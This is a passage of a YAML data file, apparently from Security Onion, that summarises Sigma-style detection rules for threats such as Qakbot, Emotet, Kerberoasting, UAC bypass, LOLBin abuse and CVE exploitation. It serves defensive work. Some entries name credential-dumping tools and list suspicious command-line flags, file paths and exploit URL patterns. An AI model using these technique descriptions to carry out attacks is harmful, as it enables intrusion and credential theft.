    Additionally, the command line must contain a ".dll" file, which is characteristic
    of Qakbot's execution pattern.
  Updated-Date: '2024_09_03'
cf93e05e-d798-4d9e-b522-b0248dc61eaf:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a2bf83fb400f41c6912e522014155262
  Ruleset: core
  Summary: This rule detects the execution of SharpChisel, a known hacking tool, through
    specific command-line arguments. SharpChisel is used for command-and-control operations
    within a Windows environment, potentially indicating malicious activity commonly
    associated with cyber attackers. The rule identifies the use of SharpChisel by
    monitoring for processes where the executable file ends with SharpChisel.exe and
    marking them as highly suspicious.
  Updated-Date: '2024_09_03'
cfec9d29-64ec-4a0f-9ffe-0fdb856d5446:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bf24242eabf3f0674cd8edcc880b7eb7
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "git" command to clone a remote
    repository containing specific suspicious keywords on a Linux system. These keywords
    include terms related to cybersecurity vulnerabilities and exploits, such as 'exploit',
    'Vulns', 'vulnerability', 'RCE', 'RemoteCodeExecution', 'Invoke-', 'CVE-', 'poc-',
    'ProofOfConcept', 'proxyshell', 'log4shell', and 'eternalblue'. The intent is
    to identify potentially malicious activities aimed at downloading repositories
    associated with known vulnerabilities or exploit frameworks.
  Updated-Date: '2024_09_04'
cfeed607-6aa4-4bbd-9627-b637deb723c8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0a07387ca55686e696bdfa7fd5c71c10
  Ruleset: sigmahq
  Summary: This rule detects the creation or renaming of a user account that contains
    the "$" character on Windows systems. Attackers may use this character to obscure
    a user account or evade detection mechanisms that do not effectively parse such
    characters. The rule specifically looks for events where an account is created
    (EventID 4720) or renamed (EventID 4781) and contains a "$" in the username. It
    includes a filter to exclude the default 'HomeGroupUser$' to minimize false positives.
  Updated-Date: '2024_09_04'
d00a9a72-2c09-4459-ad03-5e0a23351e36:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 83967ab89cb0a874e40775a2bf33251d
  Ruleset: core
  Summary: This rule detects the usage of specific LDAP attribute display names that
    are rarely used in typical company environments but are known for data exchange
    using the LDAPFragger tool. LDAPFragger utilizes these attributes for data exfiltration
    via LDAP protocol, making their presence a strong indicator of potential malicious
    activity. The attributes monitored include 'primaryInternationalISDNNumber,' 'otherFacsimileTelephoneNumber,'
    and 'primaryTelexNumber.'
  Updated-Date: '2024_09_03'
d02e8cf5-6099-48cf-9bfc-1eec2d0c7b18:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f85e861bbd60cea1f756ba695e560af1
  Ruleset: emerging-threats
  Summary: This rule detects potential Emotet malware activity by identifying process
    executions that exhibit specific characteristics associated with Emotet behavior.
    Emotet is a sophisticated, modular banking Trojan primarily used to download other
    modules or malware onto infected systems. The detection focuses on specific strings
    within the command line indicative of Emotet's operational patterns, such as encrypted
    expressions or environment variable manipulations. These specific command-line
    patterns are filtered to avoid false positives from benign processes that may
    present similar characteristics. The rule is designed to identify Emotet processes
    that may not be captured by more generic detection mechanisms, providing a more
    targeted approach to spotting this particular threat in Windows environments.
  Updated-Date: '2024_09_03'
d033cb8a-8669-4a8e-a974-48d4185a8503:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 75f3bd899db13c2d5bb5221a6c75bacc
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation attempts targeting CVE-2022-21587,
    an arbitrary file upload vulnerability affecting Oracle E-Business Suite (EBS).
    Exploitation of CVE-2022-21587 could lead to unauthenticated remote code execution.
    The rule is configured to flag HTTP POST requests containing specific queries
    in their URIs, which are indicative of the vulnerability being leveraged.
  Updated-Date: '2024_09_03'
d042284c-a296-4988-9be5-f424fadcc28c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 99b884f29bcb63ab0dc6469066f7a491
  Ruleset: sigmahq
  Summary: This rule detects the execution of the .NET tool InstallUtil.exe, which
    is used for installing and uninstalling server resources by executing custom installer
    components. Specifically, it identifies instances where InstallUtil.exe is run
    without generating logs by looking for processes where the executable resides
    in a path containing "Microsoft.NET\Framework" and the command line arguments
    include both '/logfile= ' and '/LogToConsole=false'. This behavior is associated
    with defense evasion techniques, as it can be indicative of an attempt to execute
    malicious actions without leaving a trace in log files.
  Updated-Date: '2024_09_04'
d047726b-c71c-4048-a99b-2e2f50dc107d:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 77822c3c183b61bdd30acc36badcfdf6
  Ruleset: core
  Summary: This rule detects the execution of a signed binary dropped by Kaspersky
    Lab Products Remover (kavremover) which can be misused as a Living Off the Land
    Binary (LOLBIN) to run arbitrary commands and binaries. This behavior is indicative
    of defense evasion tactics where normally trusted software is leveraged for malicious
    purposes.
  Updated-Date: '2024_09_03'
d04ae2b8-ad54-4de0-bd87-4bc1da66aa59:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 75f0e6e6c5be7c6201ff2329e78d1207
  Ruleset: sigmahq
  Summary: This rule detects possible Kerberoasting activity by collecting data to
    identify requests from a specific host or IP towards multiple service names within
    a five-second period. It focuses on EventID 4769 with a success status and RC4
    ticket encryption type. The rule excludes requests for the 'krbtgt' service, those
    from service names ending with a '$', and requests from machines. Establishing
    a threshold for the number of requests and the time between them can help convert
    this data collection into an alert system. The rule aims to aid in identifying
    suspicious credential access activity.
  Updated-Date: '2024_09_04'
d059842b-6b9d-4ed1-b5c3-5b89143c6ede:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 77d821d7ccea5c81ad8d500f22b29555
  Ruleset: sigmahq
  Summary: This rule detects the use of Bitsadmin.exe to download a file on a Windows
    system. Bitsadmin is a command-line tool used to create, download, or upload jobs
    and monitor their progress, which can be exploited for malicious purposes. The
    rule triggers when Bitsadmin is executed with specific commands related to file
    transfer, such as creating a job or adding a file with an HTTP URL. This behavior
    is indicative of potential defense evasion or persistence techniques typically
    used in cyber-attacks. The detection focuses on certain command-line parameters
    and image names associated with Bitsadmin.exe.
  Updated-Date: '2024_09_04'
d06be4b9-8045-428b-a567-740a26d9db25:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c7108d7c006a83c93ef7e2c889aa9e19
  Ruleset: sigmahq
  Summary: This rule detects the execution of the process `verclsid.exe`, which is
    used to run a COM object via a GUID. This can potentially be an indicator of an
    evasive technique as `verclsid.exe` is associated with defense evasion tactics.
    The detection focuses on specific command line arguments passed to `verclsid.exe`
    that facilitate its operation.
  Updated-Date: '2024_09_04'
d08a2711-ee8b-4323-bdec-b7d85e892b31:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 108cbb51fe78eac69fa885707b06947e
  Ruleset: core
  Summary: This rule detects the execution of CsExec, a less common remote execution
    tool that serves as an alternative to PsExec. The detection is focused on identifying
    the process creation of "csexec.exe" with a specific file description tag. This
    monitoring is used to spot potentially malicious activities, including ransomware
    deployment and unauthorized remote control, associated with adversaries that utilize
    remote execution tools in their operations.
  Updated-Date: '2024_09_03'
d08dd86f-681e-4a00-a92c-1db218754417:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8c44e8cb8c740da9d97c968853d8942b
  Ruleset: core
  Summary: This rule detects when the setting for the "xp_cmdshell" stored procedure
    in MSSQL is modified. Changes to the "xp_cmdshell" setting are notable because
    it enables the execution of shell commands through SQL Server, which could be
    abused by attackers for system-level access. The detection captures specific event
    data from the Windows application logs that indicate an alteration to this setting,
    which can occur during both enabling and disabling actions.
  Updated-Date: '2024_09_03'
d0b65ad3-e945-435e-a7a9-438e62dd48e9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3ae157619c0be986f1eebcb29e6f72fc
  Ruleset: emerging-threats
  Summary: This rule detects the loading of malicious DLL files by a compromised version
    of the 3CXDesktopApp. The detection is focused on identifying specific hash values
    associated with known compromised DLLs such as `ffmpeg.dll`, `d3dcompiler_47.dll`,
    and the ICONIC Stealer payload. The rule flags any instances where the hash of
    a loaded DLL matches the specified SHA256, SHA1, or MD5 hash values. This helps
    in identifying potential defense evasion and emerging threats within Windows environments.
  Updated-Date: '2024_09_03'
d0ba1b93-968a-401c-94fb-c8db49ff3f1a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c6095712b7758054fb698ea173c94648
  Ruleset: securityonion-resources
  Summary: This rule detects when there is a login attempt to the HTTP service on
    a Security Onion Intrusion Detection Honeypot (IDH) node.
  Updated-Date: '2024_08_07'
d0d2f720-d14f-448d-8242-51ff396a334e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c20931ce6fe063fdd9f695beaffe26c4
  Ruleset: sigmahq
  Summary: This rule detects process access requests initiated by hacktool processes
    based on their default image names in a Windows environment. It identifies the
    presence of various hacking tools known for credential access and other malicious
    activities by checking for specific executable files or filenames indicative of
    such tools. The list includes widely known hacking tools such as Mimikatz, Rubeus,
    and CrackMapExec, among others. The detection is based on the file names ending
    with certain strings or containing specific keywords associated with these tools.
    This helps in identifying potential unauthorized or malicious attempts to access
    processes on the system.
  Updated-Date: '2024_09_04'
d0dae994-26c6-4d2d-83b5-b3c8b79ae513:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f5c102cd505d242e301ac954c7362cf5
  Ruleset: sigmahq
  Summary: This rule detects the execution of WebBrowserPassView.exe, a password recovery
    tool designed to reveal stored passwords from various web browsers, including
    Internet Explorer (versions 4.0 to 11.0), Mozilla Firefox (all versions), Google
    Chrome, Safari, and Opera.
  Updated-Date: '2024_09_04'
d0fa35db-0e92-400e-aa16-d32ae2521618:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e4981c5c000d0a5798b3b3ac46c3e4ef
  Ruleset: emerging-threats
  Summary: This rule detects any registry event that targets the 'SECURITY\Policy\Secrets\n'
    key, which is associated with the SNAKE malware, as detailed by CISA. SNAKE malware
    is known for employing covert mechanisms to store data within the Windows Registry,
    and alterations to this specific key could indicate malicious activity related
    to its persistence or behavior.
  Updated-Date: '2024_09_03'
d102b8f5-61dc-4e68-bd83-9a3187c67377:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 03961df8fe45f670a84cb6ee39bee91a
  Ruleset: core
  Summary: This rule detects the creation of a file named "code_tunnel.json," which
    signals the execution and use of the Visual Studio Code (VsCode) tunneling utility
    by an executables or processes other than VsCode itself. The presence of this
    file outside the legitimate VsCode execution context may indicate unauthorized
    activities related to command-and-control operations.
  Updated-Date: '2024_09_03'
d13c43f0-f66b-4279-8b2c-5912077c1780:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 645ca9a31a1ca4a6eb5d1e401202fc16
  Ruleset: sigmahq
  Summary: This rule detects instances where a Common Language Runtime (CLR) Dynamic
    Link Library (DLL) is being loaded by Microsoft Office applications such as Excel,
    Word, PowerPoint, OneNote, Outlook, and Publisher. The detection focuses on observing
    image load events within Windows where the loaded image path contains 'clr.dll',
    indicative of potentially suspicious or malicious activity leveraging Office products
    to execute .NET code.
  Updated-Date: '2024_09_04'
d1aa3382-abab-446f-96ea-4de52908210b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fd5eebb3406c4176a16f82fd92889bbb
  Ruleset: emerging-threats
  Summary: This rule detects specific process characteristics associated with the
    TAIDOOR Remote Access Trojan (RAT) malware, which is of Chinese origin. It identifies
    instances where particular command line arguments related to the loading of the
    TAIDOOR RAT DLL are present. These arguments include uses of 'dll,MyStart' or
    'dll MyStart' and the invocation of 'rundll32.exe' with these parameters. This
    detection is crucial as TAIDOOR RAT is known for its espionage activities, often
    targeting sensitive information and giving remote attackers control over the infected
    system.
  Updated-Date: '2024_09_03'
d1b65d98-37d7-4ff6-b139-2d87c1af3042:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2480a746a05046f0a0b666dd4e7a17af
  Ruleset: emerging-threats
  Summary: This rule detects DLL sideloading activity associated with the Diamond
    Sleet APT group. It identifies instances where specific executables, such as 'clip.exe'
    and 'wsmprovhost.exe,' load particular DLLs, 'Version.dll' and 'DSROLE.dll' respectively,
    from the 'ProgramData' directory. This behavior is indicative of techniques used
    by the Diamond Sleet APT for defense evasion, as noted in recent security research.
  Updated-Date: '2024_09_03'
d20ee2f4-822c-4827-9e15-41500b1fff10:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 69d947eeb5a28b42eb44d65c5142fbce
  Ruleset: sigmahq
  Summary: This rule detects potential hijacking attempts of the Amazon SSM (Systems
    Manager) agent on Windows systems. The hijacking involves misuse of the agent
    to act as a Remote Access Trojan (RAT), as described in a Mitiga research report.
    Indicators include the execution of the 'amazon-ssm-agent.exe' process with command-line
    arguments containing '-register', '-code', '-id', and '-region', which may signify
    unauthorized registration activity potentially used for persistent access by attackers.
  Updated-Date: '2024_09_04'
d2125259-ddea-4c1c-9c22-977eb5b29cf0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b831e4894ee1550bb8f4a7b224a881b8
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "certutil.exe" utility with the
    "addstore" flag, indicating the installation of a new certificate on a Windows
    system. Attackers may use this method to install a root certificate on a compromised
    machine to bypass security warnings when connecting to adversary-controlled web
    servers.
  Updated-Date: '2024_09_04'
d21374ff-f574-44a7-9998-4a8c8bf33d7d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2a4c131506f376be9e2df49501024176
  Ruleset: sigmahq
  Summary: This rule detects instances where WmiPrvSE.exe spawns a process. WmiPrvSE.exe,
    also known as Windows Management Instrumentation Provider Service, is responsible
    for various administrative tasks on Windows operating systems. This detection
    assesses if a process is initiated by WmiPrvSE.exe and applies several filters
    to minimize false positives, including checks for system processes and common
    system user identifiers. Notably, this rule is valuable in identifying potentially
    malicious activities since adversaries often exploit WMI for remote execution
    and lateral movement within networks.
  Updated-Date: '2024_09_04'
d223b46b-5621-4037-88fe-fda32eead684:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 993d154fdbb085a15e940a4cb51ed493
  Ruleset: sigmahq
  Summary: This rule detects the addition of new root, Certificate Authority (CA),
    or AuthRoot certificates to the Windows registry. The rule monitors specific registry
    paths under the `\SOFTWARE\Microsoft\SystemCertificates`, `\SOFTWARE\Policies\Microsoft\SystemCertificates`,
    and `\SOFTWARE\Microsoft\EnterpriseCertificates` directories, focusing on the
    `Root`, `CA`, and `AuthRoot` certificate stores. The presence of binaries in these
    paths indicates the addition of certificates. Detecting such changes is crucial
    as it can indicate unauthorized or malicious activities, such as code-signing
    certificate cloning attacks, which can compromise system security by allowing
    untrusted certificates to be treated as trusted.
  Updated-Date: '2024_09_04'
d22b4df4-5a67-4859-a578-8c9a0b5af9df:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 88edf796b3ed6d64a635d7007fb41066
  Ruleset: sigmahq
  Summary: This rule detects modifications or deletions of Azure network security
    configurations. It triggers on various operations such as writing or deleting
    network security groups, modifying security rules within these groups, linking
    them to resources, and changing related diagnostic settings. Potential false positives
    might occur if a system administrator or a known user intentionally makes these
    changes, thus it is suggested to verify the legitimacy of the actions by checking
    user identity and activity context.
  Updated-Date: '2024_09_04'
d22e2925-cfd8-463f-96f6-89cec9d9bc5f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0ebd54a5f9369663e629bfc06dd3bb30
  Ruleset: sigmahq
  Summary: This rule detects the execution of ".xbap" (XAML Browser Applications)
    files through PresentationHost.EXE from uncommon locations. These applications
    can be exploited to run malicious code, thereby bypassing application whitelisting
    (AWL) defenses. The detection focuses on the presence of PresentationHost.EXE
    and command lines containing ".xbap" files, while excluding legitimate locations
    such as "C:\Windows\" and "C:\Program Files".
  Updated-Date: '2024_09_04'
d2451be2-b582-4e15-8701-4196ac180260:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 81da7ca43718ddfa09b7713775328a57
  Ruleset: sigmahq
  Summary: This rule detects potential DLL side loading involving "KeyScramblerIE.dll"
    by "KeyScrambler.exe". It identifies instances where "KeyScrambler.exe" or "KeyScramblerLogon.exe"
    load the "KeyScramblerIE.dll" outside the legitimate installation directories
    to flag possible malicious activity. The rule cross-references the validity of
    digital signatures from QFX Software Corporation to filter out legitimate use
    and focuses on detecting attempts by threat actors to exploit this mechanism for
    defense evasion or privilege escalation.
  Updated-Date: '2024_09_04'
d2605a99-2218-4894-8fd3-2afb7946514d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 730505ab0789ef3e0467861de898b4a2
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading of "mfdetours.dll". The misuse
    occurs when "mftrace.exe" is exploited to attach to an arbitrary process and force
    load any DLL named "mfdetours.dll" from the current directory of execution. This
    action aligns with tactics for defense evasion and privilege escalation within
    Windows environments, highlighting potential security breaches where unauthorized
    DLLs may be introduced into system processes.
  Updated-Date: '2024_09_04'
d26ce60c-2151-403c-9a42-49420d87b5e4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cbde5b8c3a4e913de97bc704680c9385
  Ruleset: core
  Summary: This rule detects the installation or execution of potentially harmful
    services on Windows systems, specifically those that are commonly associated with
    hack tools. It monitors for events generated by the Service Control Manager, particularly
    looking for event IDs 7045 and 7036. The rule is triggered when services with
    names such as 'cachedump', 'DumpSvc', 'gsecdump', 'pwdump', 'UACBypassedService',
    'WCE SERVICE', 'WCESERVICE', or 'winexesvc' are installed or executed. Additionally,
    the rule checks if the service image path contains the term 'bypass', which indicates
    unauthorized bypass attempts. This detection mechanism is designed to identify
    suspicious activity that may suggest the use of tools for dumping credentials
    or bypassing user account controls.
  Updated-Date: '2024_09_03'
d27eabad-9068-401a-b0d6-9eac744d6e67:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8daa20f2734625d029d39b2d3d4cc75d
  Ruleset: emerging-threats
  Summary: This rule detects GET requests to the path '/SetupWizard.aspx/[anythinghere]'
    on a web server, which suggest an exploitation attempt of the ScreenConnect vulnerability
    identified as CVE-2024-1709. This vulnerability allows an authentication bypass,
    potentially giving unauthorized access to the ScreenConnect system.
  Updated-Date: '2024_09_03'
d292e0af-9a18-420c-9525-ec0ac3936892:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d57d2396bbd89a7a8e2870d500cf384e
  Ruleset: core
  Summary: This rule detects Java processes on Linux systems that spawn suspicious
    child processes. Specifically, it looks for Java processes invoking command line
    interpreters such as sh, bash, dash, ksh, zsh, csh, fish, or utilities like curl,
    wget, and Python. Such behavior is often associated with execution of unauthorized
    scripts or commands that might indicate malicious activity.
  Updated-Date: '2024_09_03'
d29ada0f-af45-4f27-8f32-f7b77c3dbc4e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a3b062163d5b2c73152fce99aa38dc37
  Ruleset: core
  Summary: "This rule detects the use of SysmonEnte, a malicious tool designed to\
    \ compromise the integrity of Sysmon, a monitoring utility for Windows. The detection\
    \ focuses on unauthorized access attempts to the Sysmon executable files, specifically\
    \ Sysmon.exe and Sysmon64.exe, identified by particular access rights. It also\
    \ monitors for specific call traces associated with the SysmonEnte attack. Filters\
    \ are in place to exclude legitimate activities originating from commonly trusted\
    \ directories such as Program Files, System32, and Windows Defender\u2019s Platform\
    \ directory."
  Updated-Date: '2024_09_03'
d2b749ee-4225-417e-b20e-a8d2193cbb84:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 420e5cd19b9b4195dd7b78c21fe4711e
  Ruleset: sigmahq
  Summary: This rule detects the execution of the AdvancedRun utility on a Windows
    system. AdvancedRun is a tool that allows users to run a program with various
    predefined settings, such as running it with specific user privileges or window
    states. The rule specifically looks for instances where the command line includes
    parameters related to executing a file, managing window states, or specifying
    user privileges. Such executions could indicate attempts to bypass security controls,
    escalate privileges, or evade defenses.
  Updated-Date: '2024_09_04'
d2d901db-7a75-45a1-bc39-0cbf00812192:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f3455b9915f8d57868b3f15920a4935c
  Ruleset: sigmahq
  Summary: This rule detects the creation or deployment of a significant number of
    virtual machines (VMs) in Microsoft Azure. It monitors Azure Activity Logs for
    specific operations associated with VM creation (Microsoft.Compute/virtualMachines/write)
    and resource deployment (Microsoft.Resources/deployments/write). The rule helps
    identify potentially anomalous activity that could indicate unauthorized persistence
    mechanisms in the environment.
  Updated-Date: '2024_09_04'
d2eb17db-1d39-41dc-b57f-301f6512fa75:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a38f65abcb71bb3362229a9a4ff95261
  Ruleset: sigmahq
  Summary: This rule detects command line activity that references Microsoft Teams
    database or cookie files from a process other than Teams itself. This is significant
    as the database files may contain authentication tokens and other sensitive information
    related to logged-in accounts. The rule aims to identify potentially unauthorized
    access to these sensitive files to prevent credential theft or other forms of
    data compromise. Detection is focused on ensuring the process accessing these
    files is not the legitimate Teams executable.
  Updated-Date: '2024_09_04'
d353dac0-1b41-46c2-820c-d7d2561fc6ed:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6e93094a26829245f9db446094f0401f
  Ruleset: sigmahq
  Summary: This rule detects the execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl
    files via winrm.vbs and a copied or renamed cscript.exe. It focuses on the presence
    of these specific .xsl files, which are typically used in conjunction with Windows
    Remote Management (WinRM) to bypass application whitelisting. The rule checks
    for these files ending in 'WsmPty.xsl' or 'WsmTxt.xsl' and ensures they are not
    located in standard system directories like 'C:\Windows\System32\' or 'C:\Windows\SysWOW64\'.
    Detecting these conditions helps identify potential malicious activities that
    utilize these scripting files to evade security measures.
  Updated-Date: '2024_09_04'
d36f87ea-c403-44d2-aa79-1a0ac7c24456:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b23c0676a27e53cd7ae3f216b2f4e630
  Ruleset: sigmahq
  Summary: This rule detects the creation of a default named pipe by the RemCom software
    on Windows systems. RemCom is a remote command execution utility used to facilitate
    lateral movement and execution within a network. The detection involves monitoring
    named pipe events, specifically looking for pipe names that contain "\RemCom".
    Such activity might indicate either legitimate administrative actions or potential
    malicious behavior, requiring further investigation to determine the context.
  Updated-Date: '2024_09_04'
d38d2fa4-98e6-4a24-aff1-410b0c9ad177:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 575172eb5b3d55eb39a04fdd578bd097
  Ruleset: core
  Summary: This rule detects the execution of UACMe, a tool designed for bypassing
    User Account Control (UAC) on Windows systems. It focuses on identifying specific
    metadata associated with the tool, such as the product name 'UACMe', certain company
    names like 'REvol Corp' and 'APT 92', and descriptions like 'UACMe main module'.
    The rule also looks for the original filenames 'Akagi.exe' and 'Akagi64.exe',
    processes ending with these filenames, and specific image hash patterns. UACMe
    is notably utilized in defense evasion and privilege escalation attacks.
  Updated-Date: '2024_09_03'
d3abac66-f11c-4ed0-8acb-50cc29c97eed:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e74319843c56885c48c59c5924ca7d77
  Ruleset: core
  Summary: 'This rule detects a NetNTLM downgrade attack by monitoring process creation
    events within the Windows Security Event Log. It focuses on changes to specific
    registry keys associated with the Local Security Authority (LSA) that control
    NTLM configuration: ''LmCompatibilityLevel,'' ''NtlmMinClientSec,'' and ''RestrictSendingNTLMTraffic.''
    The detection is triggered when these registry paths, particularly under ''\REGISTRY\MACHINE\SYSTEM\ControlSet\Control\Lsa,''
    are altered, which can indicate an attempt to weaken NTLM security settings as
    part of a defense evasion strategy.'
  Updated-Date: '2024_09_03'
d3adb3ef-b7e7-4003-9092-1924c797db35:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b7abf116a3c04cb8729bf426707a266d
  Ruleset: core
  Summary: This rule detects changes to the identity provider in AWS Identity Center,
    previously known as AWS SSO. Such changes can allow an attacker to establish persistent
    access or escalate privileges through user impersonation by modifying identity
    provider configurations.
  Updated-Date: '2024_09_03'
d3b70aad-097e-409c-9df2-450f80dc476b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2e56dd03b3a17ab4603bab0741bc17cd
  Ruleset: core
  Summary: This rule detects the use of the Ditsnap tool, which is an inspection tool
    for the Active Directory database, ntds.dit. The detection focuses on processes
    where the image ends with 'ditsnap.exe' or command lines that contain 'ditsnap.exe'.
    The intent is to identify potential credential access activities typically associated
    with the use of this tool. While legitimate administrative usage is a possible
    false positive, the rule is set at a high alert level to highlight the significant
    risk of malicious activity.
  Updated-Date: '2024_09_03'
d3bf399f-b0cf-4250-8bb4-dfc192ab81dc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9869a74d16b27e5a9b593573aab16e0a
  Ruleset: sigmahq
  Summary: This rule detects the use of ie4uinit.exe, a legitimate Windows executable,
    to execute commands from a specially prepared ie4uinit.inf file located in directories
    other than the usual system directories (c:\windows\system32\ and c:\windows\sysWOW64\).
    The detection criteria involve monitoring the process creation logs for the ie4uinit.exe
    execution and ensuring it isn't running from standard system paths. This is important
    because ie4uinit.exe can be exploited for various malicious activities such as
    bypassing defenses, evasion, and maintaining persistence.
  Updated-Date: '2024_09_04'
d3c3861d-c504-4c77-ba55-224ba82d0118:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7af0a5ab7101b1f4dec4b0859793ff22
  Ruleset: sigmahq
  Summary: This rule detects the execution of the netsh.exe utility with the "trace"
    flag, a command used to start a network capture on a Windows system. This activity
    may indicate an attempt to monitor network traffic, which can be related to both
    legitimate administrative tasks and potential malicious activities such as network
    discovery and credential access.
  Updated-Date: '2024_09_04'
d3f90469-fb05-42ce-b67d-0fded91bbef3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9bf5da1c02081b83b41a0c3f0629ddee
  Ruleset: sigmahq
  Summary: This rule detects SSH user login access failures on Bitbucket, a platform
    used for source code repository hosting. The detection focuses on audit logs categorized
    under 'Authentication' where the action is marked as 'User login failed(SSH)'.
    It is designed to identify unsuccessful SSH login attempts, which could indicate
    potential unauthorized access attempts. However, it may produce false positives
    from legitimate users entering incorrect passwords.
  Updated-Date: '2024_09_04'
d43a269f-0fc3-4316-bbdd-ac371f3ace51:
  Created-Date: '2024_09_25'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 728100546a408198791339fb1f77597a
  Ruleset: securityonion-resources
  Summary: This rule detects when the Security Onion Detections engine has returned
    to a healthy state. It monitors events within a Security Operations Center (SOC)
    environment, focusing specifically on events where the detection engine's status
    changes back to healthy. This can be critical for maintaining the efficacy of
    security monitoring operations.
  Updated-Date: '2024_09_25'
d443095b-a221-4957-a2c4-cd1756c9b747:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 824702e93d79c30008dbe221ffd0a4ac
  Ruleset: sigmahq
  Summary: This rule detects suspicious Base64 encoded User-Agent strings that are
    typically used by certain malware. These encoded strings include variations of
    common User-Agent identifiers such as Chrome, AppleWebKit, Dalvik, and Mozilla,
    each encoded with an offset to exclude padding. These strings may be indicative
    of command-and-control activities associated with some malware types.
  Updated-Date: '2024_09_04'
d4488827-73af-4f8d-9244-7b7662ef046e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a8e953230aa568c7c8b72886b55ee99e
  Ruleset: sigmahq
  Summary: This rule detects adversarial activity where commands and their results
    are embedded within web protocol traffic by monitoring for the usage of `Invoke-WebRequest`
    with the `-UserAgent` parameter in PowerShell script block logs on Windows systems.
    This behavior may indicate attempts to communicate covertly using web traffic
    to blend in with normal network activities and avoid detection. The detection
    relies on identifying specific script block text associated with potential command-and-control
    communication.
  Updated-Date: '2024_09_04'
d4498716-1d52-438f-8084-4a603157d131:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0c3f8025e56a26548f39cba544bfad0e
  Ruleset: sigmahq
  Summary: This rule detects instances where the `net.exe` or `net1.exe` command is
    called with a password specified in the command line. It focuses on identifying
    specific patterns related to network resource usage, user authentication, and
    administrative tasks that include password parameters. Such activities could indicate
    attempts to evade defenses, gain initial access, maintain persistence, escalate
    privileges, or facilitate lateral movement within a network.
  Updated-Date: '2024_09_04'
d465d1d8-27a2-4cca-9621-a800f37cf72e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
